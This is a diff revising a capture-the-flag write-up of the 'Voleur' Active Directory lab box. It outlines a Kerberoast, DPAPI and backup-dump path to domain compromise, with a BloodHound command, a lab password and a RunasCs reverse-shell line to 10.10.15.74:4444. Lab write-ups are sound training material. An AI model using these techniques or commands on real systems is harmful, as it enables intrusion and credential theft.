@@ -12,7 +12,7 @@
 
 ## Summary
 
-Voleur is a medium Windows machine built around Active Directory, started with credentials for `ryan.naylor`. SMB only accepts Kerberos authentication, so a ticket is obtained first. A password-protected spreadsheet found on the `IT` share is cracked offline and discloses a spreadsheet of staff, notes and a handful of plaintext service-account passwords. One of those accounts, `svc_ldap`, can write the `servicePrincipalName` of other users, which is abused to run a targeted Kerberoast attack against `svc_winrm`. Its hash cracks, granting WinRM access and the user flag.
+Voleur is a medium Windows machine built around Active Directory, started with credentials for `ryan.naylor`. SMB only accepts Kerberos authentication, so a ticket is obtained first. A password-protected .xlsx file found on the `IT` share is cracked offline and discloses a table with staff names, notes and a handful of plaintext service-account passwords. One of those accounts, `svc_ldap`, can write the `servicePrincipalName` of other users, which is abused to run a targeted Kerberoast attack against `svc_winrm`. Its hash cracks, granting WinRM access and the user flag.
 
 From there, `svc_ldap` is used to restore a previously deleted user, `todd.wolfe`, whose leaked password unlocks a DPAPI-protected Windows credential blob containing `jeremy.combs`'s password. `jeremy.combs` in turn has access to a plaintext SSH private key for `svc_backup`, a Linux (WSL) account running alongside the Windows install on a non-standard SSH port. `svc_backup` can run anything as root via `sudo`, and from that root shell a Windows Backup of the domain (`ntds.dit` + `SYSTEM` hive) is found sitting on the C: drive. Dumping it offline with `secretsdump` recovers every domain hash, including `Administrator`, completing the domain compromise.
 
@@ -57,7 +57,7 @@ Host script results:
 |_clock-skew: 8h00m01s
 ```
 
-The standard AD port set is present (DNS, Kerberos, LDAP, SMB, RPC, WinRM), plus one odd detail: an **OpenSSH server for Linux running on port 2222**. Nmap's own OS fingerprint already hints at it — `OSs: Windows, Linux` — which turns out to mean the domain controller is also running a Linux subsystem (WSL) alongside Windows. That becomes relevant much later.
+The standard AD port set is present (DNS, Kerberos, LDAP, SMB, RPC, WinRM), plus one odd detail: an **OpenSSH server for Linux running on port 2222**.
 
 There's also an 8-hour clock skew between the attacker box and the target, which will break Kerberos (it needs clocks within ~5 minutes) unless it's corrected.
 
@@ -161,7 +161,7 @@ smb: \First-Line Support\> ls
 smb: \First-Line Support\> get Access_Review.xlsx
 ```
 
-The spreadsheet is password-protected. The hash is extracted with `office2john`:
+The file is password-protected. The hash is extracted with `office2john`:
 
 ![](./screens/1.png)
 
@@ -203,11 +203,11 @@ This single file is the key that opens the whole box: it hands over `svc_ldap`'s
 sudo ntpdate DC.voleur.htb && sudo -E bloodhound-python -k -u ryan.naylor -ns 10.129.232.130 -d voleur.htb -c all --zip -no-pass
 ```
 
-Ingesting the data and checking `svc_ldap`'s outbound edges shows the real win:
+Ingesting the data and checking `svc_ldap`'s outbound edges shows 2 ACL paths:
 
 ![](./screens/4.png)
 
-`svc_ldap` holds `WriteSPN` over `svc_winrm`, and is a member of a `RESTORE_USERS` group that has `GenericWrite` over `lacey.miller` and over the `Second-Line Support Technicians` OU as a whole — the latter is what will later allow restoring `todd.wolfe`.
+`svc_ldap` holds `WriteSPN` over `svc_winrm`, and is a member of a `RESTORE_USERS` group that has `GenericWrite` over `lacey.miller` and over the `Second-Line Support Technicians` OU as a whole, which will later allow restoring `todd.wolfe`.
 
 ---
 
@@ -299,7 +299,7 @@ ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
 Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 ```
 
-`todd.wolfe` is now a normal AD user again, with the password disclosed earlier in the spreadsheet (`NightT1meP1dg3on14`). A shell is spawned as him with `RunasCs`:
+`todd.wolfe` is now a normal AD user again, with the password disclosed earlier in the spreadsheet (`NightT1meP1dg3on14`). A shell is spawned as `todd.wolfe` with `RunasCs`:
 
 ```
 PS C:\tmp> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
